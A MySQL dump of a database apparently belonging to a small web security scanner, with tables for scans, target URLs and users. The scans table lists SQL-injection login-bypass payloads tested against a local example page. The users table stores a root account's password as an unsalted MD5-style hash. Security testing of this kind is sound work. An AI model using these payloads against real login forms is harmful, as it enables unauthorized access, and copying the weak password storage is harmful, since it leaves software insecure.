-- MySQL dump 10.13  Distrib 8.0.34, for Win64 (x86_64)
--
-- Host: localhost    Database: basic_security
-- ------------------------------------------------------
-- Server version	8.0.34

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `scanes`
--

DROP TABLE IF EXISTS `scanes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `scanes` (
  `scan_id` int NOT NULL AUTO_INCREMENT,
  `user_id` int DEFAULT NULL,
  `url_id` int DEFAULT NULL,
  `path` varchar(255) NOT NULL,
  `description` varchar(255) NOT NULL,
  `payload` varchar(255) NOT NULL,
  `content_length` int NOT NULL,
  `status` int NOT NULL,
  PRIMARY KEY (`scan_id`),
  KEY `urlId_idx` (`url_id`),
  KEY `userId_idx` (`user_id`),
  CONSTRAINT `urlId` FOREIGN KEY (`url_id`) REFERENCES `urls` (`id`) ON DELETE SET NULL ON UPDATE SET NULL,
  CONSTRAINT `userId` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL ON UPDATE SET NULL
) ENGINE=InnoDB AUTO_INCREMENT=138 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `scanes`
--

LOCK TABLES `scanes` WRITE;
/*!40000 ALTER TABLE `scanes` DISABLE KEYS */;
INSERT INTO `scanes` VALUES (113,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or true--',223,200),(114,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\'or 1-- -',223,200),(115,1,8,'/Examples/ex1/ex1.php','Auth Bypass','admin\' or \'1\'=\'1\'--',223,200),(116,1,8,'/Examples/ex1/ex1.php','Auth Bypass','admin\' or \'1\'=\'1\'/*',223,200),(117,1,8,'/Examples/ex1/ex1.php','Auth Bypass','admin\'or 1=1 or \'\'=\'',223,200),(118,1,8,'/Examples/ex1/ex1.php','Auth Bypass','admin\' or 1=1--',223,200),(119,1,8,'/Examples/ex1/ex1.php','Auth Bypass','admin\' or 1=1/*',223,200),(120,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 0=0 --',223,200),(121,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 1=1--',223,200),(122,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or \'1\'=\'1\'--',223,200),(123,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or \'1\'=\'1\'/*',223,200),(124,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 1=1--',223,200),(125,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 1=1 --',223,200),(126,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 1=1/*',223,200),(127,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 1=1;#',223,200),(128,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\'or 1=1 or \'\'=\'',223,200),(129,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 1=1 LIMIT 1;#',223,200),(130,1,8,'/Examples/ex1/ex1.php','Auth Bypass','\' or 1=1 limit 1 -- -+',223,200);
/*!40000 ALTER TABLE `scanes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `urls`
--

DROP TABLE IF EXISTS `urls`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `urls` (
  `id` int NOT NULL AUTO_INCREMENT,
  `user_id` int DEFAULT NULL,
  `url` varchar(255) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `userId_idx` (`user_id`),
  CONSTRAINT `url_userId` FOREIGN KEY (`user_id`) REFERENCES `users` (`id`) ON DELETE SET NULL ON UPDATE SET NULL
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `urls`
--

LOCK TABLES `urls` WRITE;
/*!40000 ALTER TABLE `urls` DISABLE KEYS */;
INSERT INTO `urls` VALUES (8,1,'http://localhost/');
/*!40000 ALTER TABLE `urls` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `users` (
  `id` int NOT NULL AUTO_INCREMENT,
  `username` varchar(255) NOT NULL,
  `email` varchar(255) NOT NULL,
  `password` varchar(255) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=5 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'root','root@gmail.com','63a9f0ea7bb98050796b649e85481845');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2023-10-13 12:40:26
